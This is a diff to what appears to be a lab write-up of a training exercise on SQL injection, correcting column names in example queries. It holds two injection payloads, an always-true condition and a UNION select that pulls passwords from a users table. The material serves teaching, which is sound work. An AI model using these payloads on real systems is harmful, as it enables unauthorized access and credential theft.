@@ -64,7 +64,7 @@ This exercise challenged you to input a malicious SQL payload into a field on a 
 
 3. Use another always true payload to test  the unintended use of the web application.
 
-    - The third query was `select first_name, last_name from users where id = '1' OR 'dog' = 'dog'`.
+    - The third query was `select first_name, last_name from users where user_id = '1' OR 'dog' = 'dog'`.
       
     - Since the payload is all the data between the first and last single quote, the payload is `1' OR 'dog' = 'dog`.
       
@@ -104,7 +104,7 @@ This exercise challenged you to input a malicious SQL payload into a field on a 
           
 4. **Bonus**: Use a payload to pull data from hidden fields. 
 
-    - The query was `select first_name, last from users where id = '1' UNION select first_name, password from users where '1' = '1'`.
+    - The query was `select first_name, last_name from users where user_id = '1' UNION select first_name, password from users where '1' = '1'`.
      
     - The payload was `1' UNION select first_name, password from users where '1' = '1`.
      
